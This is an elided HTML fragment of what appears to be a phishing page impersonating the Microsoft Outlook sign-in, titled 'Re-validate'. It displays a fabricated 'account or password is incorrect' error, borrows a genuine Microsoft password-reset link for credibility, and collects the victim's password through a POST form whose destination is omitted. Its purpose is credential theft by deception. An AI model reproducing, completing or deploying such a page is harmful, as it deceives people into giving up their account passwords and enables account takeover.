...
<head>
    ...
    <title>Sign into Outlook Portal | Re-validate</title>
...
" method = "post">
            ...
            <p style = "margin-left:50px; margin-top:15px; font-size:15px; color:#e81123">Your account or password is incorrect.If you don't remember your password, <a href = "https://passwordreset.microsoftonline.com">reset it now.</a></p>
            <input type = "password" value = "" name = "password" id = "" class = "inputicon2" placeholder = "Password" style = "height:44px; background-color:white; width:330px; margin-left:50px; padding-left:5px; margin-top:-10px;       border:none; border-bottom:1px solid #e81123;">
